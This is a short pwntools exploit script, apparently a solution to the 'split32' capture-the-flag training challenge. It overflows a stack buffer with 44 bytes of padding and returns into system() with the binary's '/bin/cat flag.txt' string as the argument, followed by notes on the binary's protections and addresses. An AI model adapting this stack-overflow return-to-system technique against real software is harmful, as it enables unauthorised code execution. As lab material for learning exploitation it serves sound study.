#!/usr/bin/env python3

from pwn import *

exe = './split32'
elf = context.binary = ELF(exe,checksec=False)
#context.log_level='debug'

p = process(exe)

padding = 44

#bin_cat = 0x804a030 # search "/bin" in pwndbg
#system = 0x0804861a # disassemble usefulFunction

bin_cat = next(elf.search(b'/bin/cat'))

payload = flat(
    asm('nop')*padding,#padding to reach EIP
   # system,
    elf.symbols.system,
    elf.symbols.main, # return address after calling system 
    bin_cat,          # passing '/bin/cat flag.txt' as parameter to system
)

p.sendlineafter(b'> ',payload)
p.interactive()
'''
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    In usefulFunction() it is calling system() of libc

       0x0804861a <+14>:	call   0x80483e0 <system@plt>
since no PIE, its address will remain same

0x08048615      push    str.bin_ls ; 0x804870e ; const char *string
0x0804861a      call    system     ; sym.imp.system ; int system(const char *string)
calling system with /bin/ls
from pwndbg:  split32         0x804a030 '/bin/cat flag.txt'

'''

